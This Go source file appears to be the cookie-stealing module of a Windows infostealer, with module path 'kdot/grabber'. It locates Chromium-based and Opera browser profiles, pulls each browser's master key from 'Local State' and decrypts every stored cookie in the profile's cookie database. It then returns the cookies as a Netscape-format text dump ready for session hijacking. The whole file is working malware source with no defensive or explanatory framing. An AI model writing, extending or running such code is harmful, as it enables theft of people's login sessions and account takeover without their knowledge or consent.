package cookies

import (
	"database/sql"
	"os"
	"strings"

	"kdot/grabber/browsers/util"
	"kdot/grabber/decryption"
)

func Get() string {
	var cookies string
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		master_key := decryption.GetMasterKey(path + "\\Local State")
		ranOpera := false
		for _, profile := range extraPaths {
			if ranOpera {
				break
			} else if strings.Contains(path, "Opera") {
				profile = path
				if _, err := os.Stat(path); os.IsNotExist(err) {
					continue
				}
			} else {
				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
					continue
				}
				path = path + "\\" + profile
			}
			db, err := sql.Open("sqlite3", path+"\\Network\\Cookies")
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host_key string
				var name string
				var path_this string
				var encrypted_value []byte
				var expires_utc string
				row.Scan(&host_key, &name, &path_this, &encrypted_value, &expires_utc)
				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
				if err != nil {
					decrypted = string(encrypted_value)
				}
				expired := "TRUE"
				if expires_utc == "0" {
					expired = "FALSE"
				}
				tf_other := "TRUE"
				if host_key[0] == '.' {
					tf_other = "FALSE"
				}
				cookies = cookies + host_key + "\t" + expired + "\t" + path_this + "\t" + tf_other + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
			}
		}
	}
	return cookies
}
